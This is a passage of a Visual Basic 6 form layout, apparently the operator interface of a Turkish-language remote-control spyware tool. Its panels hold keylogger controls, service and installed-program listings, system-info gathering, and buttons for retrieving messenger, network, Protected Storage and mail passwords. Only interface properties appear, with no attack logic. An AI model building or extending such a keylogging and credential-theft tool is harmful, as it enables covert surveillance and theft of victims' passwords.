         Left            =   6120
         TabIndex        =   71
         ToolTipText     =   "online keyloggeri kapat"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5302E
         PICN            =   "Form1.frx":53348
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   26
         Left            =   6120
         TabIndex        =   72
         ToolTipText     =   "loglari kaydet"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":536FA
         PICN            =   "Form1.frx":53A14
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   27
         Left            =   6120
         TabIndex        =   75
         ToolTipText     =   "loglari temizle"
         Top             =   2160
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":53D66
         PICN            =   "Form1.frx":54080
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Online Keylogger"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   17
         Left            =   0
         TabIndex        =   73
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   6
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   63
      Top             =   1800
      Width           =   6735
      Begin Client.cmd btn 
         Height          =   495
         Index           =   18
         Left            =   6120
         TabIndex        =   64
         ToolTipText     =   "servis listesini al"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5432A
         PICN            =   "Form1.frx":54644
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView lvw 
         Height          =   4695
         Index           =   4
         Left            =   120
         TabIndex        =   65
         Top             =   360
         Width           =   5895
         _ExtentX        =   10398
         _ExtentY        =   8281
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "sysinfolist"
         SmallIcons      =   "sysinfolist"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         MousePointer    =   99
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   5
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Name"
            Object.Width           =   2117
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Display Name"
            Object.Width           =   2117
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "Status"
            Object.Width           =   1235
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "Startup"
            Object.Width           =   1235
         EndProperty
         BeginProperty ColumnHeader(5) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   4
            Text            =   "Module"
            Object.Width           =   3087
         EndProperty
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   22
         Left            =   6120
         TabIndex        =   66
         ToolTipText     =   "otomatik"
         Top             =   3960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":549C6
         PICN            =   "Form1.frx":54CE0
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   23
         Left            =   6120
         TabIndex        =   67
         ToolTipText     =   "elle"
         Top             =   4560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":54EE2
         PICN            =   "Form1.frx":551FC
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   33
         Left            =   6120
         TabIndex        =   87
         ToolTipText     =   "seçili servisi baþlat"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":553FE
         PICN            =   "Form1.frx":55718
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   34
         Left            =   6120
         TabIndex        =   88
         ToolTipText     =   "seçili servisi durdur"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":559AA
         PICN            =   "Form1.frx":55CC4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   35
         Left            =   6120
         TabIndex        =   89
         ToolTipText     =   "servisi duraklat"
         Top             =   2160
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":55FAA
         PICN            =   "Form1.frx":562C4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   36
         Left            =   6120
         TabIndex        =   90
         ToolTipText     =   "servisi baslat"
         Top             =   2760
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":565AA
         PICN            =   "Form1.frx":568C4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   37
         Left            =   6120
         TabIndex        =   91
         ToolTipText     =   "deaktif"
         Top             =   3360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":56B56
         PICN            =   "Form1.frx":56E70
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Servisler"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   16
         Left            =   0
         TabIndex        =   68
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   5
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   57
      Top             =   1440
      Width           =   6735
      Begin Client.cmd btn 
         Height          =   495
         Index           =   1
         Left            =   6120
         TabIndex        =   58
         ToolTipText     =   "yüklü program listesini al"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":57072
         PICN            =   "Form1.frx":5738C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView lvw 
         Height          =   4695
         Index           =   3
         Left            =   120
         TabIndex        =   59
         Top             =   360
         Width           =   5895
         _ExtentX        =   10398
         _ExtentY        =   8281
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "sysinfolist"
         SmallIcons      =   "sysinfolist"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         MousePointer    =   99
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   4
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Name"
            Object.Width           =   2117
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Version"
            Object.Width           =   2117
         EndProperty
         BeginProperty ColumnHeader(3) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   2
            Text            =   "Publisher"
            Object.Width           =   1764
         EndProperty
         BeginProperty ColumnHeader(4) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   3
            Text            =   "Path"
            Object.Width           =   3528
         EndProperty
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   2
         Left            =   6120
         TabIndex        =   60
         ToolTipText     =   "listeyi kaydet"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":576DE
         PICN            =   "Form1.frx":579F8
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   3
         Left            =   6120
         TabIndex        =   61
         ToolTipText     =   "listeyi temizle"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":57D4A
         PICN            =   "Form1.frx":58064
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Yüklü Programlar"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   15
         Left            =   0
         TabIndex        =   62
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   4
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   6
      Top             =   1080
      Width           =   6735
      Begin Client.cmd btn 
         Height          =   495
         Index           =   19
         Left            =   6120
         TabIndex        =   7
         ToolTipText     =   "sistem bilgisini al"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":58416
         PICN            =   "Form1.frx":58730
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin MSComctlLib.ListView lvw 
         Height          =   4695
         Index           =   2
         Left            =   120
         TabIndex        =   8
         Top             =   360
         Width           =   5895
         _ExtentX        =   10398
         _ExtentY        =   8281
         View            =   3
         LabelWrap       =   -1  'True
         HideSelection   =   -1  'True
         GridLines       =   -1  'True
         _Version        =   393217
         Icons           =   "sysinfolist"
         SmallIcons      =   "sysinfolist"
         ForeColor       =   -2147483640
         BackColor       =   -2147483643
         BorderStyle     =   1
         Appearance      =   0
         MousePointer    =   99
         BeginProperty Font {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         NumItems        =   2
         BeginProperty ColumnHeader(1) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            Text            =   "Description"
            Object.Width           =   4057
         EndProperty
         BeginProperty ColumnHeader(2) {BDD1F052-858B-11D1-B16A-00C0F0283628} 
            SubItemIndex    =   1
            Text            =   "Information"
            Object.Width           =   5468
         EndProperty
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   20
         Left            =   6120
         TabIndex        =   9
         ToolTipText     =   "sistem bilgisini kaydet"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":58A82
         PICN            =   "Form1.frx":58D9C
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   21
         Left            =   6120
         TabIndex        =   10
         ToolTipText     =   "sistem bilgisini temizle"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   16777215
         MPTR            =   99
         MICON           =   "Form1.frx":590EE
         PICN            =   "Form1.frx":59408
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin VB.Label lbl 
         Alignment       =   2  'Center
         Appearance      =   0  'Flat
         BackColor       =   &H00000000&
         Caption         =   "Sistem Bilgisi"
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   9.75
            Charset         =   162
            Weight          =   400
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00FFFFFF&
         Height          =   255
         Index           =   12
         Left            =   0
         TabIndex        =   11
         Top             =   0
         Width           =   6735
      End
   End
   Begin VB.PictureBox ortacerceve 
      Appearance      =   0  'Flat
      BackColor       =   &H80000005&
      BeginProperty Font 
         Name            =   "MS Sans Serif"
         Size            =   8.25
         Charset         =   162
         Weight          =   400
         Underline       =   0   'False
         Italic          =   0   'False
         Strikethrough   =   0   'False
      EndProperty
      ForeColor       =   &H80000008&
      Height          =   5175
      Index           =   3
      Left            =   12600
      ScaleHeight     =   5145
      ScaleWidth      =   6705
      TabIndex        =   48
      Top             =   720
      Width           =   6735
      Begin VB.TextBox txtsifreler 
         Appearance      =   0  'Flat
         BackColor       =   &H00FFFFFF&
         BeginProperty Font 
            Name            =   "Tahoma"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         ForeColor       =   &H00404040&
         Height          =   4695
         Index           =   0
         Left            =   120
         MultiLine       =   -1  'True
         ScrollBars      =   2  'Vertical
         TabIndex        =   51
         Top             =   360
         Width           =   5895
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   12
         Left            =   6120
         TabIndex        =   49
         ToolTipText     =   "Instant Messenger Þifreleri"
         Top             =   360
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":597BA
         PICN            =   "Form1.frx":59AD4
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   13
         Left            =   6120
         TabIndex        =   52
         ToolTipText     =   "Network Þifreleri"
         Top             =   960
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":59E26
         PICN            =   "Form1.frx":5A140
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   14
         Left            =   6120
         TabIndex        =   53
         ToolTipText     =   "Protected Storage Þifreleri"
         Top             =   1560
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
         MPTR            =   99
         MICON           =   "Form1.frx":5A492
         PICN            =   "Form1.frx":5A7AC
         UMCOL           =   -1  'True
         SOFT            =   0   'False
         PICPOS          =   0
         NGREY           =   0   'False
         FX              =   0
         HAND            =   -1  'True
         CHECK           =   0   'False
         VALUE           =   0   'False
      End
      Begin Client.cmd btn 
         Height          =   495
         Index           =   15
         Left            =   6120
         TabIndex        =   54
         ToolTipText     =   "Mail Þifreleri"
         Top             =   2160
         Width           =   495
         _ExtentX        =   873
         _ExtentY        =   873
         BTYPE           =   3
         TX              =   ""
         ENAB            =   -1  'True
         BeginProperty FONT {0BE35203-8F91-11CE-9DE3-00AA004BB851} 
            Name            =   "MS Sans Serif"
            Size            =   8.25
            Charset         =   162
            Weight          =   700
            Underline       =   0   'False
            Italic          =   0   'False
            Strikethrough   =   0   'False
         EndProperty
         COLTYPE         =   2
         FOCUSR          =   -1  'True
         BCOL            =   16777215
         BCOLO           =   16777215
         FCOL            =   0
         FCOLO           =   0
         MCOL            =   12632256
